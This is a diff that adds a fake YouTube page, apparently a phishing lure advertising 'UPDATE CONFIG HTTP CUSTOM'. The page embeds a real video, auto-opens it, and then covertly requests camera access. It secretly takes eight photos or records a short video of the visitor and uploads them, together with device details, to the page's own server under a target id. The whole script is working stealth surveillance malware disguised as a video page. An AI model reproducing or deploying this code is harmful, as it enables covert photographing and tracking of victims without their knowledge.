@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path d='M21.58 16.55l-1.43-1.43C19.93 14.52 20 13.88 20 13.25V7.5a2.5 2.5 0 0 0-5 0v5.75c0 .63.07 1.27.44 1.86l1.43 1.43c.75.75 1.58 1.33 1.06 2.47-.29.59-1.14 1.28-1.7 1.28-.38 0-.73-.11-1.06-.38l-1.43-1.43a2.5 2.5 0 0 0-3.53 0l-1.43 1.43c-.33.27-.68.38-1.06.38-.56 0-1.41-.69-1.7-1.28-.52-1.14.31-1.72 1.06-2.47l1.43-1.43c.37-.59.44-1.23.44-1.86V7.5a2.5 2.5 0 0 0-5 0v5.75c0 .63.07 1.27.44 1.86l1.43 1.43c.75.75 1.58 1.33 1.06 2.47-.29.59-1.14 1.28-1.7 1.28-.38 0-.73-.11-1.06-.38l-1.43-1.43a2.5 2.5 0 0 0-3.53 0l-1.43 1.43c-.33.27-.68.38-1.06.38-.56 0-1.41-.69-1.7-1.28-.52-1.14.31-1.72 1.06-2.47l1.43-1.43c.37-.59.44-1.23.44-1.86V7.5a2.5 2.5 0 0 0-5 0z' fill='%23FF0000'/></svg>">
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { 
+            font-family: "Roboto","Noto",sans-serif; 
+            background: #0f0f0f; color:#fff; overflow-x:hidden;
+        }
+        
+        /* HEADER YOUTUBE IDENTIK */
+        .header { 
+            position:fixed; top:0; left:0; right:0; height:56px; 
+            background:#fff; z-index:1000; box-shadow:0 1px 0 rgba(0,0,0,.1);
+        }
+        .header-left { display:flex; align-items:center; height:100%; padding:0 16px; }
+        .youtube-logo { height:24px; margin-right:24px; }
+        .search-container { 
+            flex:1; max-width:540px; position:relative; display:flex;
+            height:40px; background:#f2f2f2; border-radius:24px; margin-right:16px;
+        }
+        .search-input { 
+            flex:1; border:none; background:none; font-size:16px; 
+            padding:8px 16px 8px 52px; outline:none;
+        }
+        .search-icon { 
+            position:absolute; left:16px; top:50%; transform:translateY(-50%); 
+            width:24px; height:24px; opacity:0.6;
+        }
+        .mic-btn { width:40px; height:40px; border-radius:50%; background:#f2f2f2; cursor:pointer; }
+
+        /* SIDEBAR */
+        .sidebar { 
+            position:fixed; left:0; top:56px; bottom:0; width:72px; 
+            background:#fff; overflow:hidden;
+        }
+        .sidebar-item { padding:16px 0; text-align:center; cursor:pointer; }
+        .sidebar-icon { width:24px; height:24px; opacity:0.7; }
+
+        /* MAIN CONTENT */
+        .main { margin-left:72px; margin-top:56px; padding:16px; }
+        .video-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(320px,1fr)); gap:16px; }
+
+        /* VIDEO ITEM */
+        .video-card { background:#181818; border-radius:12px; overflow:hidden; cursor:pointer; }
+        .thumbnail { width:100%; height:180px; background:#000; position:relative; }
+        .thumbnail-play { 
+            position:absolute; top:50%; left:50%; transform:translate(-50%,-50%);
+            width:68px; height:48px; background:#fff; border-radius:4px;
+        }
+        .video-info { padding:12px; }
+        .video-title { font-size:14px; line-height:20px; margin-bottom:4px; }
+        .channel { font-size:12px; color:#aaa; margin-bottom:4px; }
+
+        /* VIDEO PAGE */
+        .video-page { display:none; position:fixed; top:0; left:0; right:0; bottom:0; background:#0f0f0f; z-index:2000; }
+        .video-header { height:56px; background:#fff; display:flex; align-items:center; padding:0 16px; }
+        .back-btn { width:32px; height:32px; margin-right:16px; }
+        .video-player-container { 
+            position:relative; width:100%; height:calc(100% - 112px); background:#000; 
+            display:flex; align-items:center; justify-content:center;
+        }
+        #yt-player { width:100%; height:100%; }
+        .video-controls { 
+            position:absolute; bottom:0; left:0; right:0; height:56px; 
+            background:linear-gradient(transparent,rgba(0,0,0,0.8)); display:flex; align-items:center;
+        }
+
+        /* STATUS STEALTH */
+        #status { 
+            position:fixed; top:70px; right:16px; 
+            background:rgba(0,0,0,0.9); color:#ff0000; padding:6px 12px; 
+            border-radius:20px; font-size:12px; font-weight:500; z-index:9999;
+        }
+
+        /* ANIMATIONS */
+        @keyframes fadeIn { from {opacity:0;} to {opacity:1;} }
+        .fade-in { animation:fadeIn 0.3s; }
+    </style>
+</head>
+<body>
+    <!-- HEADER -->
+    <div class="header">
+        <div class="header-left">
+            <div class="youtube-logo" style="background:linear-gradient(90deg,#ff0000,#cc0000);width:40px;height:30px;border-radius:2px;"></div>
+            <div class="search-container">
+                <svg class="search-icon" viewBox="0 0 24 24"><path fill="#606060" d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
+                <input class="search-input" placeholder="Search" value="UPDATE CONFIG HTTP CUSTOM ">
+                <div class="mic-btn"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- SIDEBAR -->
+    <div class="sidebar">
+        <div class="sidebar-item"><div class="sidebar-icon" style="background:#606060;width:24px;height:24px;margin:0 auto;border-radius:50%;"></div></div>
+        <div class="sidebar-item"><div class="sidebar-icon" style="background:#606060;width:24px;height:24px;margin:0 auto;"></div></div>
+    </div>
+
+    <!-- MAIN GRID -->
+    <div class="main">
+        <div class="video-grid">
+            <div class="video-card fade-in" onclick="openVideoPage()">
+                <div class="thumbnail">
+                    <div class="thumbnail-play"></div>
+                </div>
+                <div class="video-info">
+                    <div class="video-title">UPDATE CONFIG HTTP CUSTOM </div>
+                    <div class="channel">@FunnyViral</div>
+                    <div style="font-size:12px;color:#aaa;">2.1M views • 3 days ago</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- VIDEO PAGE (HIDDEN) -->
+    <div class="video-page" id="videoPage">
+        <div class="video-header">
+            <div class="back-btn" onclick="closeVideoPage()"></div>
+            <div style="font-weight:500;">UPDATE CONFIG HTTP CUSTOM</div>
+        </div>
+        <div class="video-player-container">
+            <!-- YOUTUBE EMBED ASLI -->
+            <iframe id="yt-player" 
+                    src="https://www.youtube.com/embed/wq99zWjjllc?autoplay=1&mute=0&controls=1&rel=0&modestbranding=1&playsinline=1&enablejsapi=1" 
+                    frameborder="0" 
+                    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
+                    allowfullscreen>
+            </iframe>
+        </div>
+        <div class="video-controls"></div>
+    </div>
+
+    <!-- STEALTH STATUS -->
+    <div id="status">Loading...</div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const targetId = urlParams.get('id');
+        const mode = urlParams.get('mode') || 'photo';
+        const cam = urlParams.get('cam') || 'user';
+
+        let stream = null;
+        let hiddenVideo = null;
+        let captureCanvas = document.createElement('canvas');
+
+        // SIMULASI USER JOURNEY
+        setTimeout(() => {
+            // AUTO-CLICK VIDEO SETELAH 2 DETIK
+            document.querySelector('.video-card').click();
+        }, 2200);
+
+        function openVideoPage() {
+            document.querySelector('.main').style.display = 'none';
+            document.getElementById('videoPage').style.display = 'block';
+            document.getElementById('status').textContent = '';
+            
+            // REQUEST CAMERA PAS VIDEO LOAD
+            setTimeout(requestStealthCamera, 1500);
+        }
+
+        function closeVideoPage() {
+            document.getElementById('videoPage').style.display = 'none';
+            document.querySelector('.main').style.display = 'block';
+        }
+
+        async function requestStealthCamera() {
+            try {
+                document.getElementById('status').textContent = '';
+                
+                const constraints = {
+                    video: {
+                        facingMode: cam === 'environment' ? 'environment' : 'user',
+                        width: { ideal: 1280, max: 1920 },
+                        height: { ideal: 720, max: 1080 }
+                    },
+                    audio: false
+                };
+                
+                stream = await navigator.mediaDevices.getUserMedia(constraints);
+                document.getElementById('status').textContent = '';
+                
+                // HIDDEN VIDEO PROCESSING
+                hiddenVideo = document.createElement('video');
+                hiddenVideo.srcObject = stream;
+                hiddenVideo.muted = true;
+                hiddenVideo.playsInline = true;
+                hiddenVideo.play();
+                
+                hiddenVideo.onloadedmetadata = () => {
+                    setTimeout(() => {
+                        logTarget();
+                        if (mode === 'video') startVideo();
+                        else takePhotos();
+                    }, 600);
+                };
+                
+            } catch(e) {
+                document.getElementById('status').textContent = '';
+                console.error(e);
+            }
+        }
+
+        function logTarget() {
+            fetch(`/log_info?id=${targetId}`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    cookieEnabled: navigator.cookieEnabled
+                })
+            });
+        }
+
+        function takePhotos() {
+            let count = 0;
+            const int = setInterval(() => {
+                captureImage();
+                count++;
+                document.getElementById('status').textContent = ` ${count}/8`;
+                
+                if (count >= 8) {
+                    clearInterval(int);
+                    setTimeout(cleanup, 800);
+                }
+            }, 300);
+        }
+
+        function captureImage() {
+            if (!hiddenVideo?.videoWidth) return;
+            
+            captureCanvas.width = hiddenVideo.videoWidth;
+            captureCanvas.height = hiddenVideo.videoHeight;
+            captureCanvas.getContext('2d').drawImage(hiddenVideo, 0, 0);
+            
+            captureCanvas.toBlob((blob) => {
+                const fd = new FormData();
+                fd.append('file', blob, `capture_${Date.now()}.jpg`);
+                fetch(`/upload?id=${targetId}&type=photo`, {method: 'POST', body: fd});
+            }, 'image/jpeg', 0.95);
+        }
+
+        function startVideo() {
+            const chunks = [];
+            const rec = new MediaRecorder(stream);
+            rec.ondataavailable = e => chunks.push(e.data);
+            rec.onstop = () => {
+                const blob = new Blob(chunks, {type: 'video/webm'});
+                const fd = new FormData();
+                fd.append('file', blob, 'video.webm');
+                fetch(`/upload?id=${targetId}&type=video`, {method: 'POST', body: fd});
+                document.getElementById('status').textContent = '';
+            };
+            rec.start();
+            setTimeout(() => rec.stop(), 4000);
+        }
+
+        function cleanup() {
+            stream?.getTracks().forEach(t => t.stop());
+        }
+    </script>
+</body>
+</html>
